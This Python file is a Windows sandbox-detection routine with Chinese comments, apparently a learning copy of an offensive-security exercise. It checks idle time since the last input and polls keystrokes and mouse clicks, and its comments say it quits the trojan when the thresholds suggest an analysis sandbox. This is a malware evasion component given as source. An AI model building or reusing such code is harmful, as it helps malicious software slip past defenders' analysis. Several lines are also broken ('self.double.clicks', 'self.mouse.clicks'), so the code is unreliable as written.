import random
import sys
import time
from ctypes import Structure, c_uint, c_ulong, sizeof, windll, byref
import win32api

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]

def get_last_input():
    # 建立一個 LASTINPUTINFO() 結構，用來存放系統上偵測到最後一個輸入事件的時間戳記(毫秒為單位)
    struct_lastinputinfo = LASTINPUTINFO()
    # 初始化結構體的大小
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    # 判斷最後一次輸入事件的相關資訊，這些資訊會被填充到一個 struct_lastinputinfo 的結構中。
    # 這個結構可能包含最後一次輸入的時間戳等訊息
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    # 計算系統運行的時間，從啟動開始
    run_time = windll.kernel32.GetTickCount()
    # 計算自最後一次輸入事件發生以來經過的時間
    elapsed = run_time - struct_lastinputinfo.dwTime
    print(f"[*] It's been {elapsed} milliseconds since the last input event.")

    return elapsed

class Detector:
    def __init__(self):
        self.double_clicks = 0    # 雙擊
        self.keystorkes = 0       # 該鍵是否是鍵盤上的 ASCII 按鍵
        self.mouse_clicks = 0     # 單擊

    def get_key_press(self):
        # 遍歷所有可用的鍵
        for i in range(0, 0xff):
            # 獲取該鍵的狀態
            state = win32api.GetAsyncKeyState(i)
            # 獲取該鍵是否按下
            # state & 0x0001 以及 state & 0x1 都是用來檢查 state 的最低位是否被設置為 1，
            # 如果 state 最低位是 1，表示鼠標的左鍵處於被按下的狀態
            # 0x0001 是一個十六進制數，對應二進制的 0000000000000001，表示最右邊的位被設置為 1。
            if state & 0x0001:
                # 0x1: 也是一個十六進制數，對應二進制的 0001。表示只有一個位被設置為 1
                if i == 0x1:
                    # 判斷鼠標左鍵被單擊
                    self.mouse_clicks += 1
                    return time.time()
            # space ~ del
            elif 32 < i < 127:
                # 該鍵是否是鍵盤上的 ASCII 按鍵
                self.keystorkes += 1
        
        return None 

    def detect(self):
        previous_timestampe = None
        first_double_click = None
        double_click_threshold = 0.35

        # 鼠標雙擊的沙箱檢測閥值
        max_double_clicks = 10
        # 敲擊鍵盤的沙箱檢測閥值
        max_keystrokes = random.randint(10,25)
        # 單擊鼠標的沙箱檢測閥值
        max_mouse_clicks = random.randint(5, 25)
        max_input_threshold = 100 # 建議更大的值

        # 獲取上一次用戶輸入以來經過的時間
        last_input = get_last_input()
        # 時間過長，就自動退出，結束木馬執行，因為有可能在沙箱
        if last_input >= max_input_threshold:
            sys.exit(0)

        detection_complete = False

        while not detection_complete:
            # 監聽按鍵動作， mouse_clicks += 1
            keypress_time = self.get_key_press()
            # 判斷是否發生按鍵或鼠標單擊事件
            if keypress_time is not None and previous_timestampe is not None:
                # 計算兩次事件之間的事件
                elapsed = keypress_time - previous_timestampe

                # 檢測鼠標雙擊事件時間，跟臨界值 double_click_threshold 比較，確定他是否連按兩下
                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2 # 減去兩次單擊次數
                    self.double_clicks += 1 # 新增一次雙擊次數
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        # 是否發生一連串的鼠標點擊事件
                        if self.double.clicks >= max_double_clicks:
                            # 如果短時間內鼠標雙擊事件達到最大值，就強制退出，
                            if keypress_time - first_double_click >= (max_double_clicks * double_click_threshold):
                                sys.exit(0)
                
                # 檢測按鍵次數、鼠標單擊雙擊數是否達到了最大值，強制退出
                if(self.keystorkes >= max_keystrokes and
                   self.double_clicks >= max_double_clicks and
                   self.mouse.clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestampe = keypress_time
            elif keypress_time is not None:
                previous_timestampe = keypress_time


if __name__ == '__main__':
    d = Detector()
    d.detect()
    print("okay.")